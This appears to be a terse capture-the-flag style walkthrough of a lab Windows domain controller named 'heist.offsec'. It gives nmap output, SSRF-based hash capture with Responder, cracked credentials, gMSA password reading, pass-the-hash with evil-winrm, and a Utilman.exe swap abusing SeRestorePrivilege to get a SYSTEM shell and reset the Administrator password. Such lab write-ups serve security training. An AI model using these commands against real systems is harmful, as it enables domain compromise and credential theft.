53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-05 07:20:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: heist.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-05T07:21:28+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: HEIST
|   NetBIOS_Domain_Name: HEIST
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: heist.offsec
|   DNS_Computer_Name: DC01.heist.offsec
|   DNS_Tree_Name: heist.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-05T07:20:48+00:00
| ssl-cert: Subject: commonName=DC01.heist.offsec
| Issuer: commonName=DC01.heist.offsec
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-08-04T07:17:24
| Not valid after:  2027-02-03T07:17:24
| MD5:   6eed:777d:00ed:7374:fe80:29ba:6a58:35d5
|_SHA-1: 0a0f:ce8e:e2b0:ac49:09af:6fc1:021d:deb0:96fe:1332
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp  open  http          Werkzeug httpd 2.0.1 (Python 3.9.0)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-server-header: Werkzeug/2.0.1 Python/3.9.0
|_http-title: Super Secure Web Browser
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49704/tcp open  msrpc         Microsoft Windows RPC


port 8080
<img width="1446" height="598" alt="image" src="https://github.com/user-attachments/assets/91f8e954-30be-4e3e-a3a9-a7cf0c13e41e" />
putting google.com in the url gave me this. Galactic Web Service of Sagittarius V4641.
<img width="1434" height="510" alt="image" src="https://github.com/user-attachments/assets/1f1ec20a-e357-4c44-b405-c96fd391d1f9" />
potential privesc?
<img width="949" height="322" alt="image" src="https://github.com/user-attachments/assets/c7dde086-4b9c-4c83-942e-83bb80a01031" />
SSRF
sudo responder -I tun0 -wv 
<img width="811" height="236" alt="image" src="https://github.com/user-attachments/assets/1f7e517d-a256-4d53-802d-141499f1b0b9" />
<img width="1908" height="148" alt="image" src="https://github.com/user-attachments/assets/62e943b7-b14e-4e6c-ae65-78f915413b7d" />
enox:california
<img width="890" height="186" alt="image" src="https://github.com/user-attachments/assets/64d5bf7e-4bb6-4122-9e17-ec3121862be7" />
evil-winrm to enox
<img width="1055" height="408" alt="image" src="https://github.com/user-attachments/assets/f9145f37-7e04-435e-a9c2-6e4defdde1de" />

enox is a in a group called web admins
upon investigating on bloodhound. webadmin is able to read gmsa password
<img width="967" height="211" alt="image" src="https://github.com/user-attachments/assets/c3b47392-7510-49ef-a8a8-d07640e95a75" />
netexec ldap $ip -u enox -p california --gmsa 
get the ntlm, then use it to evil-winrm
evil-winrm -i $ip -u svc_apache$ -H 1169a68c02b287c7d88ce7e512acbee7 
whoami /priv shows serestore... HEHEHE. i love this exploit
<img width="664" height="187" alt="image" src="https://github.com/user-attachments/assets/fb66f1dd-0855-44ec-b1a5-9ff16465d257" />
ren Utilman.exe Utilman.old
ren cmd.exe Utilman.exe
rdesktop 192.168.x.172
Click on that Logo on the bottom right and get a SYSTEM cmd
dsa.msc
Reset Administrator's password
psexec.py Administrator:'PasswordYouSet'@192.168.x.172
<img width="679" height="317" alt="image" src="https://github.com/user-attachments/assets/98ab0e51-d183-4b44-8cbd-98967e7e6bb1" />



